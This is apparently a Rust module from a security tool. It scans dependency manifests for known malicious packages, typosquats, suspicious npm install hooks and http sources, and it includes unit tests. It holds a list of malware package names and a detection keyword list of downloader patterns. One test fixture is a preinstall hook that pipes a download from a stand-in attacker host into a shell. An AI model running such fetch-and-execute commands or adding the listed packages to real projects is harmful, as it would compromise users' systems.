//! Supply-chain compromise detection.
//!
//! A [`Scanner`](crate::Scanner) over dependency manifests (npm `package.json`,
//! Python `requirements*.txt`, Rust `Cargo.toml`) that flags the classic
//! attack patterns *offline* — no feeds needed:
//!
//! - **Known-malicious packages** — names that only ever existed as malware
//!   (e.g. `flatmap-stream`, `colourama`); an embedded list today, to be
//!   superseded by downloadable IOC/OSV datasets.
//! - **Typosquats** — dependencies one edit away from a very popular package
//!   (`lodahs` → `lodash`, `reqeusts` → `requests`).
//! - **Malicious install hooks** — npm `preinstall`/`install`/`postinstall`
//!   scripts, escalated when they pipe the network into a shell, decode
//!   base64, or eval.
//! - **Insecure sources** — dependencies fetched over plain `http://`.
//!
//! Version-pinned compromise detection (packages that were briefly hijacked,
//! e.g. `ua-parser-js`) needs version-aware IOC datasets and is tracked on
//! the roadmap.

use std::path::Path;

use anyhow::Result;
use exfil_core::{Match, Severity, Snippet};

use crate::Scanner;

/// Packages that are malware outright — the name itself is the indicator.
/// (Packages that were *temporarily* hijacked, like `ua-parser-js`, are NOT
/// listed: flagging every use of a legitimate name would be all noise.)
const KNOWN_MALWARE: &[&str] = &[
    // npm
    "flatmap-stream",
    "eslint-scope-malicious",
    "electorn",
    "crossenv",
    "cross-env.js",
    "d3.js-malware",
    "web3-essential",
    // PyPI
    "colourama",
    "python3-dateutil-malware",
    "jeIlyfish",
    "ctx-malware",
    "pymafka",
];

/// Very popular packages worth guarding against one-character typosquats.
///
/// Names must be at least [`nearmiss::MIN_PROTECTED_LEN`] characters to have
/// any effect — below that the one-edit neighbourhood is mostly legitimate
/// packages — so `vue` and `syn` are deliberately absent rather than listed and
/// silently inert.
///
/// [`nearmiss::MIN_PROTECTED_LEN`]: crate::nearmiss::MIN_PROTECTED_LEN
const POPULAR: &[&str] = &[
    // npm
    "lodash",
    "express",
    "react",
    "axios",
    "chalk",
    "commander",
    "webpack",
    "typescript",
    "jquery",
    "moment",
    "next",
    "eslint",
    "prettier",
    // PyPI
    "requests",
    "urllib3",
    "numpy",
    "pandas",
    "django",
    "flask",
    "boto3",
    "setuptools",
    "cryptography",
    "pillow",
    // crates.io
    "serde",
    "tokio",
    "anyhow",
    "regex",
    "clap",
    "libc",
    "rand",
];

/// Install-hook script fragments that scream "downloader":
/// network-to-shell pipes, base64 decoding, eval.
const HOOK_RED_FLAGS: &[&str] = &[
    "curl", "wget", "base64", "eval(", "eval ", "node -e", "| sh", "|sh", "| bash", "|bash",
];

/// Real, widely-installed packages that happen to sit one edit from a name in
/// [`POPULAR`], and are therefore not typosquats of it.
///
/// Spelling similarity is evidence, not a verdict, and this is the half the
/// scanner cannot infer: `preact` really is one edit from `react`, and it is
/// also a mainstream framework with millions of installs. Without this list the
/// scanner reported the npm ecosystem's best-known projects as attacks on each
/// other — at `High`, which with `--fail-on high` fails an entirely healthy
/// build.
///
/// Kept beside [`POPULAR`] on purpose: adding a name to one is the moment to
/// ask whether it belongs in the other.
const NOT_TYPOSQUATS: &[&str] = &[
    "preact", // one edit from `react`
    "nuxt",   // one edit from `next`
    "nest",   // one edit from `next`
];

/// If `name` looks like a typosquat, return the popular package it imitates.
///
/// Three things must hold: the name is not itself popular, it is not a known
/// legitimate near neighbour, and it impersonates a popular name by the shared
/// [`nearmiss`](crate::nearmiss) test — which is also where this check picked
/// up homoglyph folding (`l0dash` → `lodash`) and the floor that stops `vue`
/// from flagging `vuex`.
fn typosquat_of(name: &str) -> Option<&'static str> {
    if POPULAR.contains(&name) || NOT_TYPOSQUATS.contains(&name) {
        return None;
    }
    POPULAR
        .iter()
        .find(|p| crate::nearmiss::impersonates(name, p))
        .copied()
}

/// The 1-based line on which `needle` first appears, for match locations.
fn line_of(content: &str, needle: &str) -> u32 {
    content
        .lines()
        .position(|l| l.contains(needle))
        .map(|i| i as u32 + 1)
        .unwrap_or(1)
}

/// One class of supply-chain indicator: its rule name and classification.
struct Indicator {
    rule: &'static str,
    severity: Severity,
    cwe: &'static str,
}

const KNOWN_MALWARE_IND: Indicator = Indicator {
    rule: "supply-chain-known-malware",
    severity: Severity::Critical,
    cwe: "CWE-506",
};
const TYPOSQUAT_IND: Indicator = Indicator {
    rule: "supply-chain-typosquat",
    severity: Severity::High,
    cwe: "CWE-829",
};
const INSECURE_SOURCE_IND: Indicator = Indicator {
    rule: "supply-chain-insecure-source",
    severity: Severity::Medium,
    cwe: "CWE-829",
};

/// Scans dependency manifests for supply-chain compromise indicators.
pub struct SupplyChainScanner;

impl SupplyChainScanner {
    /// Build a match for one indicator.
    fn finding(
        &self,
        path: &Path,
        content: &str,
        anchor: &str,
        ind: &Indicator,
        description: String,
    ) -> Match {
        Match {
            rule: ind.rule.to_string(),
            path: path.to_string_lossy().into_owned(),
            line: line_of(content, anchor),
            col: 1,
            snippet: Snippet::describe(description),
            severity: Some(ind.severity),
            cwe: Some(ind.cwe.to_string()),
            cve: None,
        }
    }

    /// Checks shared by every ecosystem: known malware and typosquats.
    fn check_deps(&self, path: &Path, content: &str, deps: &[String], out: &mut Vec<Match>) {
        for dep in deps {
            if KNOWN_MALWARE.contains(&dep.as_str()) {
                out.push(self.finding(
                    path,
                    content,
                    dep,
                    &KNOWN_MALWARE_IND,
                    format!("dependency {dep:?} is a known malicious package"),
                ));
            } else if let Some(target) = typosquat_of(dep) {
                out.push(self.finding(
                    path,
                    content,
                    dep,
                    &TYPOSQUAT_IND,
                    format!(
                        "dependency {dep:?} is one edit away from {target:?} (possible typosquat)"
                    ),
                ));
            }
        }
        // Insecure transport applies to the raw text of any manifest.
        for line in content.lines() {
            if line.contains("http://") && !line.trim_start().starts_with('#') {
                out.push(self.finding(
                    path,
                    content,
                    "http://",
                    &INSECURE_SOURCE_IND,
                    "dependency source fetched over cleartext http".to_string(),
                ));
                break; // one finding per manifest is enough signal
            }
        }
    }

    /// npm: dependency names plus install hooks from `package.json`.
    fn scan_package_json(&self, path: &Path, content: &str, out: &mut Vec<Match>) {
        let Ok(json) = serde_json::from_str::<serde_json::Value>(content) else {
            return; // unparseable manifests are not this scanner's problem
        };
        let mut deps = Vec::new();
        for table in ["dependencies", "devDependencies", "optionalDependencies"] {
            if let Some(map) = json.get(table).and_then(|v| v.as_object()) {
                deps.extend(map.keys().cloned());
            }
        }
        self.check_deps(path, content, &deps, out);

        // Install hooks run arbitrary code on `npm install` — the single most
        // abused supply-chain vector on npm.
        if let Some(scripts) = json.get("scripts").and_then(|v| v.as_object()) {
            for hook in ["preinstall", "install", "postinstall"] {
                let Some(script) = scripts.get(hook).and_then(|v| v.as_str()) else {
                    continue;
                };
                let red_flag = HOOK_RED_FLAGS.iter().any(|f| script.contains(f));
                let (sev, why) = if red_flag {
                    (
                        Severity::Critical,
                        format!("{hook} hook downloads or evals code: {script:?}"),
                    )
                } else {
                    (
                        Severity::Medium,
                        format!("{hook} hook runs code on install: {script:?}"),
                    )
                };
                let ind = Indicator {
                    rule: "supply-chain-install-hook",
                    severity: sev,
                    cwe: "CWE-94",
                };
                out.push(self.finding(path, content, hook, &ind, why));
            }
        }
    }

    /// PyPI: one requirement per line, name up to the first version operator.
    fn scan_requirements(&self, path: &Path, content: &str, out: &mut Vec<Match>) {
        let deps: Vec<String> = content
            .lines()
            .map(str::trim)
            .filter(|l| !l.is_empty() && !l.starts_with('#') && !l.starts_with('-'))
            .map(|l| {
                l.split(['=', '<', '>', '~', '!', ';', '[', ' '])
                    .next()
                    .unwrap_or(l)
                    .trim()
                    .to_string()
            })
            .filter(|n| !n.is_empty())
            .collect();
        self.check_deps(path, content, &deps, out);
    }

    /// crates.io: keys of the `[dependencies]`-family tables in `Cargo.toml`.
    fn scan_cargo_toml(&self, path: &Path, content: &str, out: &mut Vec<Match>) {
        let Ok(value) = content.parse::<toml::Value>() else {
            return;
        };
        let mut deps = Vec::new();
        for table in ["dependencies", "dev-dependencies", "build-dependencies"] {
            if let Some(map) = value.get(table).and_then(|v| v.as_table()) {
                deps.extend(map.keys().cloned());
            }
        }
        self.check_deps(path, content, &deps, out);
    }
}

impl Scanner for SupplyChainScanner {
    fn name(&self) -> &str {
        "supply-chain"
    }

    fn applies(&self, path: &Path) -> bool {
        // `leaf_name`, not `file_name`: a manifest at a container's root has
        // a path like `archive.zip!package.json`, where `!` is the separator.
        let Some(name) = exfil_core::leaf_name(path) else {
            return false;
        };
        name == "package.json"
            || name == "Cargo.toml"
            || (name.starts_with("requirements") && name.ends_with(".txt"))
    }

    fn scan(&self, path: &Path, content: &[u8]) -> Result<Vec<Match>> {
        let content = String::from_utf8_lossy(content);
        let name = exfil_core::leaf_name(path).unwrap_or_default();
        let mut out = Vec::new();
        match name {
            "package.json" => self.scan_package_json(path, &content, &mut out),
            "Cargo.toml" => self.scan_cargo_toml(path, &content, &mut out),
            _ => self.scan_requirements(path, &content, &mut out),
        }
        Ok(out)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan(name: &str, content: &str) -> Vec<Match> {
        // A process-wide counter keeps each call in its own directory: tests
        // run in parallel and two of them scan a file named `package.json`.
        static UNIQ: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
        let dir = std::env::temp_dir().join(format!(
            "exfil-supply-{}-{}",
            std::process::id(),
            UNIQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join(name);
        let scanner = SupplyChainScanner;
        assert!(scanner.applies(&path), "scanner must apply to {name}");
        let out = scanner.scan(&path, content.as_bytes()).unwrap();
        let _ = std::fs::remove_dir_all(&dir);
        out
    }

    #[test]
    fn npm_known_malware_and_typosquat() {
        let matches = scan(
            "package.json",
            r#"{"dependencies": {"flatmap-stream": "0.1.1", "lodahs": "1.0.0", "express": "4.18.0"}}"#,
        );
        let rules: Vec<&str> = matches.iter().map(|m| m.rule.as_str()).collect();
        assert!(rules.contains(&"supply-chain-known-malware"), "{matches:?}");
        assert!(rules.contains(&"supply-chain-typosquat"), "{matches:?}");
        assert_eq!(
            matches.len(),
            2,
            "express itself must not flag: {matches:?}"
        );
        assert!(matches
            .iter()
            .any(|m| m.severity == Some(Severity::Critical)));
    }

    #[test]
    fn npm_install_hooks() {
        // A benign hook is medium; a downloader hook is critical.
        let matches = scan(
            "package.json",
            r#"{"scripts": {"postinstall": "node scripts/setup.js", "preinstall": "curl http://evil.example/x | sh"}}"#,
        );
        let hooks: Vec<&Match> = matches
            .iter()
            .filter(|m| m.rule == "supply-chain-install-hook")
            .collect();
        assert_eq!(hooks.len(), 2, "{matches:?}");
        assert!(hooks.iter().any(|m| m.severity == Some(Severity::Medium)));
        assert!(hooks.iter().any(|m| m.severity == Some(Severity::Critical)));
    }

    #[test]
    fn requirements_typosquat_and_clean_names() {
        let matches = scan(
            "requirements.txt",
            "requests==2.31.0\nreqeusts==9.9.9\nnumpy>=1.26\n# a comment\n",
        );
        assert_eq!(matches.len(), 1, "{matches:?}");
        assert_eq!(matches[0].rule, "supply-chain-typosquat");
        assert_eq!(matches[0].line, 2, "points at the offending line");
    }

    #[test]
    fn cargo_toml_typosquat_and_insecure_source() {
        let matches = scan(
            "Cargo.toml",
            "[package]\nname = \"x\"\n\n[dependencies]\nserde = \"1\"\ntokoi = \"1\"\nfoo = { git = \"http://example.com/foo\" }\n",
        );
        let rules: Vec<&str> = matches.iter().map(|m| m.rule.as_str()).collect();
        assert!(rules.contains(&"supply-chain-typosquat"), "{matches:?}");
        assert!(
            rules.contains(&"supply-chain-insecure-source"),
            "{matches:?}"
        );
    }

    /// Regression: spelling similarity was treated as a verdict, so three of
    /// npm's best-known frameworks were reported as attacks on each other — at
    /// `High`, which fails a healthy build under `--fail-on high`.
    #[test]
    fn mainstream_packages_are_not_typosquats_of_each_other() {
        for name in ["preact", "nuxt", "nest"] {
            assert_eq!(typosquat_of(name), None, "{name} is a real package");
        }
        // The floor keeps a three-character name from flagging its own
        // ecosystem's satellites.
        assert_eq!(typosquat_of("vuex"), None);
        assert_eq!(typosquat_of("sync"), None);

        // Actual squats still fire, including homoglyphs the package check
        // never used to fold.
        assert_eq!(typosquat_of("lodahs"), Some("lodash"));
        assert_eq!(typosquat_of("l0dash"), Some("lodash"));
        assert_eq!(typosquat_of("reqeusts"), Some("requests"));
    }

    #[test]
    fn a_real_manifest_of_popular_frameworks_is_silent() {
        let matches = scan(
            "package.json",
            r#"{"dependencies": {"nuxt": "3.0.0", "preact": "10.0.0", "nest": "1.0.0", "express": "4.18.0"}}"#,
        );
        assert!(matches.is_empty(), "{matches:?}");
    }

    #[test]
    fn clean_manifests_stay_silent() {
        assert!(scan(
            "package.json",
            r#"{"dependencies": {"express": "4.18.0", "react": "18.2.0"}}"#
        )
        .is_empty());
        assert!(scan("requirements.txt", "requests==2.31.0\nnumpy\n").is_empty());
        assert!(scan("Cargo.toml", "[dependencies]\nserde = \"1\"\n").is_empty());
    }

    #[test]
    fn does_not_apply_to_other_files() {
        assert!(!SupplyChainScanner.applies(Path::new("src/main.rs")));
        assert!(SupplyChainScanner.applies(Path::new("a/package.json")));
        assert!(SupplyChainScanner.applies(Path::new("requirements-dev.txt")));
    }

    #[test]
    fn edit_distance_basics() {
        assert_eq!(crate::nearmiss::distance("lodash", "lodash"), 0);
        assert_eq!(crate::nearmiss::distance("lodahs", "lodash"), 1); // transposition
        assert_eq!(crate::nearmiss::distance("lodas", "lodash"), 1); // deletion
        assert_eq!(crate::nearmiss::distance("reqeusts", "requests"), 1); // transposition
        assert_eq!(crate::nearmiss::distance("banana", "lodash"), 5);
        assert_eq!(typosquat_of("serde"), None, "popular names never flag");
        assert_eq!(typosquat_of("serd"), Some("serde"));
        assert_eq!(typosquat_of("tokoi"), Some("tokio"));
    }
    /// Regression: a manifest at a *container's root* has a path like
    /// `archive.zip!package.json`, where `!` — not `/` — is the separator, so
    /// `Path::file_name` returns the whole string. This scanner used to skip
    /// those while finding the identical file one directory deeper.
    #[test]
    fn a_manifest_at_a_container_root_is_still_recognised() {
        let s = SupplyChainScanner;
        for p in [
            "package.json",
            "/home/u/proj/package.json",
            "archive.zip!package.json",
            "archive.zip!inner/package.json",
            "disc.iso!Cargo.toml",
            "backup.tar!requirements.txt",
            "a.zip!b.iso!package.json",
        ] {
            assert!(s.applies(Path::new(p)), "should apply to {p}");
        }
        for p in ["notes.txt", "archive.zip!notes.txt", "src/main.rs"] {
            assert!(!s.applies(Path::new(p)), "should not apply to {p}");
        }
    }

    /// …and it must actually produce the finding, not merely accept the path:
    /// the scan path reads the manifest's name a second time.
    #[test]
    fn a_container_root_manifest_yields_its_findings() {
        let s = SupplyChainScanner;
        let json = br#"{"dependencies": {"flatmap-stream": "0.1.1"}}"#;
        let at_root = s.scan(Path::new("archive.zip!package.json"), json).unwrap();
        let nested = s
            .scan(Path::new("archive.zip!inner/package.json"), json)
            .unwrap();
        assert!(!at_root.is_empty(), "root-level manifest produced nothing");
        assert_eq!(
            at_root.len(),
            nested.len(),
            "depth must not change findings"
        );
    }
}
